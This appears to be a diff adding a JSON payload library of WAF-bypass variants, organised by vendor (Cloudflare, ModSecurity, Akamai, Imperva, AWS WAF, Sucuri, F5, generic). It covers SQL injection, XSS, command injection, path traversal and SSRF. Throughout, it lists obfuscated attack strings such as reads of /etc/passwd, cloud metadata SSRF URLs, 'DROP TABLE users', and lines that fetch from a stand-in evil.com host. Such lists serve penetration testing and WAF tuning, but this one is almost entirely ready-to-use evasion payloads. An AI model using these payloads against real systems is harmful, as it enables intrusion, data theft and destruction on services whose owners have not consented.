@@ -1,0 +1,166 @@
+{
+  "cloudflare": {
+    "sql_injection": [
+      {"original": "' OR 1=1", "variants": ["' oR 1=1--", "'%09OR%091=1--", "' OR 0x31=0x31--", "'/**/OR/**/1=1--", "' OR 1=1#"]},
+      {"original": "UNION SELECT", "variants": ["UnIoN/**/SeLeCt", "UNION/*!50000SELECT*/", "UNION%0aSELECT", "/*!UNION*/ /*!SELECT*/", "UNION(SELECT"]},
+      {"original": "' AND 1=1", "variants": ["' %26%26 1=1--", "'/**/AND/**/1=1--", "' aNd 0x31=0x31--", "' AND/*!50000*/1=1--"]},
+      {"original": "SELECT * FROM users", "variants": ["SeLeCt/**/*/**/FrOm/**/users", "SELECT/*!50000*/*/**/FROM/**/users", "SELECT%09*%09FROM%09users"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<ScRiPt>alert(1)</ScRiPt>", "<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<script>alert`1`</script>", "<script/x>alert(1)</script>"]},
+      {"original": "javascript:alert(1)", "variants": ["java%0ascript:alert(1)", "JaVaScRiPt:alert(1)", "javascript&#58;alert(1)", "javascript\u0000:alert(1)"]},
+      {"original": "<img src=x onerror=alert(1)>", "variants": ["<img/src=x/onerror=alert(1)>", "<img src=x onerror=\"alert(1)\">", "<img src=`x` onerror=alert(1)>", "<IMG SRC=x OnErRoR=alert(1)>"]}
+    ],
+    "cmd_injection": [
+      {"original": "; cat /etc/passwd", "variants": ["%0acat%09/etc/passwd", ";cat${IFS}/etc/passwd", "|cat</etc/passwd", "`cat /etc/passwd`", ";c''at /etc/passwd"]},
+      {"original": "&& whoami", "variants": ["%26%26%20whoami", "%0awhoami", "|whoami", "`whoami`", "$(whoami)"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd", "..%252f..%252f..%252fetc%252fpasswd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd"]},
+      {"original": "/etc/passwd", "variants": ["/etc/./passwd", "/etc//passwd", "/%65tc/passwd", "/etc/passwd%00"]}
+    ],
+    "ssrf": [
+      {"original": "http://169.254.169.254/", "variants": ["http://169.254.169.254./", "http://[::ffff:169.254.169.254]/", "http://2852039166/", "http://0251.0376.0251.0376/", "http://169%2e254%2e169%2e254/"]},
+      {"original": "http://127.0.0.1/", "variants": ["http://localhost/", "http://0/", "http://127.1/", "http://[::1]/", "http://0x7f000001/"]}
+    ]
+  },
+  "modsecurity": {
+    "sql_injection": [
+      {"original": "' OR 1=1", "variants": ["'/*!50000OR*/1=1--", "' OR/**/1=1--", "' %6fR 1=1--", "'+OR+1=1--", "' OR 'a'='a"]},
+      {"original": "UNION SELECT", "variants": ["/*!50000UNION*/ /*!50000SELECT*/", "UN/*!*/ION SEL/*!*/ECT", "union(/**/select", "UNION ALL SELECT"]},
+      {"original": "SLEEP(5)", "variants": ["BENCHMARK(5000000,MD5(1))", "SLEEP/**/(5)", "PG_SLEEP(5)", "WAITFOR DELAY '0:0:5'"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<svg><script>alert(1)</script></svg>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<details open ontoggle=alert(1)>"]},
+      {"original": "onerror=alert(1)", "variants": ["onerror=alert`1`", "onerror=%0aalert(1)", "onerror = alert(1)", "onerror=top['al'+'ert'](1)"]},
+      {"original": "<img src=x onerror=alert(1)>", "variants": ["<IMG\"\"\"><SCRIPT>alert(1)</SCRIPT>\">", "<img/src/onerror=alert(1)>", "<img src=x:x onerror=alert(1)>"]}
+    ],
+    "cmd_injection": [
+      {"original": "; ls", "variants": [";l\\s", ";l''s", ";/bin/l?", ";ls$IFS", ";${PATH:0:1}bin${PATH:0:1}ls"]},
+      {"original": "| whoami", "variants": ["|w\\hoami", "|/usr/bin/whoami", "|${IFS}whoami", "|who\"\"ami"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["..\\..\\..\\etc\\passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "/var/www/../../etc/passwd"]}
+    ],
+    "ssrf": [
+      {"original": "http://127.0.0.1/", "variants": ["http://127.0.0.1.nip.io/", "http://spoofed.burpcollaborator.net/", "http://127.0.0.1%23@evil.com/", "gopher://127.0.0.1/"]}
+    ]
+  },
+  "akamai": {
+    "sql_injection": [
+      {"original": "' OR 1=1", "variants": ["'+OR+(1)=(1)--", "' OR 1 LIKE 1--", "' OR 1=1 LIMIT 1--", "' || 1=1--", "'; OR 1=1--"]},
+      {"original": "UNION SELECT", "variants": ["union distinct select", "union all select", "UNION(SELECT(1))", "/*!12345UNION*/ /*!12345SELECT*/"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>", "<svg><animate onbegin=alert(1)>", "<math><mtext><script>alert(1)</script>"]},
+      {"original": "alert(1)", "variants": ["alert`1`", "(alert)(1)", "window['alert'](1)", "top[/al/.source+/ert/.source](1)"]}
+    ],
+    "cmd_injection": [
+      {"original": "; id", "variants": [";i\\d", ";$(echo id)", ";`echo id`", ";id${IFS}"]},
+      {"original": "&& cat /etc/passwd", "variants": ["&&cat<>/etc/passwd", "&&cat$IFS/etc/passwd", "&&c''at /etc/passwd"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["..;/..;/..;/etc/passwd", "..%5c..%5c..%5cetc%5cpasswd", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"]}
+    ],
+    "ssrf": [
+      {"original": "http://169.254.169.254/", "variants": ["http://metadata.google.internal/", "http://169.254.169.254.xip.io/", "http://[0:0:0:0:0:ffff:a9fe:a9fe]/"]}
+    ]
+  },
+  "imperva": {
+    "sql_injection": [
+      {"original": "' OR 1=1", "variants": ["' OR 'x'='x", "' OR 1=1 AND ''='", "'/*!OR*/1=1--", "' OR 2>1--", "' OR 1 BETWEEN 0 AND 2--"]},
+      {"original": "UNION SELECT", "variants": ["/*!UNION*/ /*!SELECT*/", "UNION/*comment*/SELECT", "UNI%00ON SEL%00ECT", "union%250aselect"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<script>alert&#x28;1&#x29;</script>", "<script>alert/**/(1)</script>", "<script>al\\u0065rt(1)</script>", "<script>eval('ale'+'rt(1)')</script>"]},
+      {"original": "<img src=x onerror=alert(1)>", "variants": ["<img src=1 href=1 onerror=\"javascript:alert(1)\">", "<img src=x:alert(alt) onerror=eval(src) alt=xss>"]}
+    ],
+    "cmd_injection": [
+      {"original": "; whoami", "variants": [";${@-whoami}", ";wh''oami", ";who\\ami", ";/?s=whoami"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["....//....//....//etc/passwd", "..%u2215..%u2215..%u2215etc%u2215passwd", "..%e0%80%af..%e0%80%afetc%e0%80%afpasswd"]}
+    ],
+    "ssrf": [
+      {"original": "http://127.0.0.1:80/", "variants": ["http://127.0.0.1:80%00/", "http://127.0.0.1:80@evil.com/", "http://127.0.0.1:80#@evil.com/"]}
+    ]
+  },
+  "aws_waf": {
+    "sql_injection": [
+      {"original": "' OR 1=1", "variants": ["'+OR+1=1--", "' OR 1=1;%00", "' OR 'A'='A", "' OR CHAR(49)=CHAR(49)--", "' OR 1 IS NOT NULL--"]},
+      {"original": "UNION SELECT", "variants": ["UNION%20SELECT", "UNION%a0SELECT", "UNION%20ALL%20SELECT", "/**/UNION/**/SELECT/**/"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<sc<script>ript>alert(1)</sc</script>ript>", "<script src=//evil.com/x.js></script>", "<scr\u0000ipt>alert(1)</scr\u0000ipt>"]},
+      {"original": "onerror=alert(1)", "variants": ["onerror\t=\talert(1)", "onerror=\"alert\\u00281\\u0029\"", "onerror=alert(String.fromCharCode(49))"]}
+    ],
+    "cmd_injection": [
+      {"original": "; curl evil.com", "variants": [";curl%09evil.com", ";cu''rl evil.com", ";curl$IFS$9evil.com", "|curl evil.com"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5Cetc%5Cpasswd", "%2e%2e%5c%2e%2e%5cetc%5cpasswd"]}
+    ],
+    "ssrf": [
+      {"original": "http://169.254.169.254/latest/meta-data/", "variants": ["http://169.254.169.254/latest/meta-data//", "http://169.254.169.254/latest/dynamic/instance-identity/document", "http://[fd00:ec2::254]/latest/meta-data/"]}
+    ]
+  },
+  "sucuri": {
+    "sql_injection": [
+      {"original": "' OR 1=1", "variants": ["' || 1=1--", "' %09OR%09 1=1--", "' OR 1=1-- -", "'/**/OR/**/1=1 LIMIT 1--"]},
+      {"original": "UNION SELECT", "variants": ["union%09select", "UNION%0dSELECT", "UniOn/*!SelecT*/", "union/**/select"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<scr\tipt>alert(1)</scr\tipt>", "<svg onload=alert(1)>", "<a href=javascript:alert(1)>click"]},
+      {"original": "<img src=x onerror=alert(1)>", "variants": ["<img src=/ onerror=alert(1)>", "<img src=# onerror=alert(1)>"]}
+    ],
+    "cmd_injection": [
+      {"original": "; uname -a", "variants": [";uname%09-a", ";un''ame -a", ";uname$IFS-a"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%2f..%2f..%2fetc%2fpasswd%00", "..\\..\\..\\etc\\passwd"]}
+    ],
+    "ssrf": [
+      {"original": "http://localhost/", "variants": ["http://localtest.me/", "http://127.0.0.1.nip.io/", "http://127.127.127.127/"]}
+    ]
+  },
+  "f5_bigip": {
+    "sql_injection": [
+      {"original": "' OR 1=1", "variants": ["'/**/OR/**/1=1--", "' OR ASCII('A')=65--", "' OR HEX('A')='41'--", "'+OR+1=1--"]},
+      {"original": "UNION SELECT", "variants": ["UNION(SELECT(NULL))", "UNION%250aSELECT", "/*!UNION*/%0a/*!SELECT*/"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<script\n>alert(1)</script>", "<script>\nalert(1)\n</script>", "<script/src=data:,alert(1)>"]}
+    ],
+    "cmd_injection": [
+      {"original": "; id", "variants": [";${IFS}id", ";i''d", "|id"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["..%00/..%00/..%00/etc/passwd", "..%20/..%20/..%20/etc/passwd"]}
+    ],
+    "ssrf": [
+      {"original": "http://127.0.0.1/", "variants": ["http://0177.0.0.1/", "http://2130706433/"]}
+    ]
+  },
+  "generic": {
+    "sql_injection": [
+      {"original": "' OR 1=1--", "variants": ["' oR 1=1--", "' OR '1'='1", "' OR 1=1#", "'/**/OR/**/1=1--", "' OR 1=1/*", "admin'--", "admin' #", "' OR 'a'='a'--"]},
+      {"original": "UNION SELECT", "variants": ["UnIoN SeLeCt", "union%20select", "union/**/select", "UNION ALL SELECT", "/*!UNION*/ /*!SELECT*/"]},
+      {"original": "'; DROP TABLE users;--", "variants": ["'; DrOp TaBlE users;--", "';%20DROP%20TABLE%20users;--", "';/**/DROP/**/TABLE/**/users;--"]}
+    ],
+    "xss": [
+      {"original": "<script>alert(1)</script>", "variants": ["<ScRiPt>alert(1)</ScRiPt>", "<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "\"><script>alert(1)</script>", "';alert(1);//"]},
+      {"original": "javascript:alert(1)", "variants": ["JaVaScRiPt:alert(1)", "java\tscript:alert(1)", "java\nscript:alert(1)", "javascript:alert(String.fromCharCode(49))"]}
+    ],
+    "cmd_injection": [
+      {"original": "; cat /etc/passwd", "variants": ["|cat /etc/passwd", "&&cat /etc/passwd", "`cat /etc/passwd`", "$(cat /etc/passwd)", ";cat${IFS}/etc/passwd", "%0acat /etc/passwd"]},
+      {"original": "&& whoami", "variants": ["|whoami", "`whoami`", "$(whoami)", ";whoami"]}
+    ],
+    "path_traversal": [
+      {"original": "../../../etc/passwd", "variants": ["..\\..\\..\\etc\\passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd", "....//....//....//etc/passwd", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"]}
+    ],
+    "ssrf": [
+      {"original": "http://127.0.0.1/", "variants": ["http://localhost/", "http://[::1]/", "http://0.0.0.0/", "http://0/", "http://127.1/", "http://2130706433/", "http://0x7f000001/"]},
+      {"original": "http://169.254.169.254/", "variants": ["http://169.254.169.254./", "http://metadata.google.internal/", "http://[::ffff:169.254.169.254]/"]}
+    ]
+  }
+}
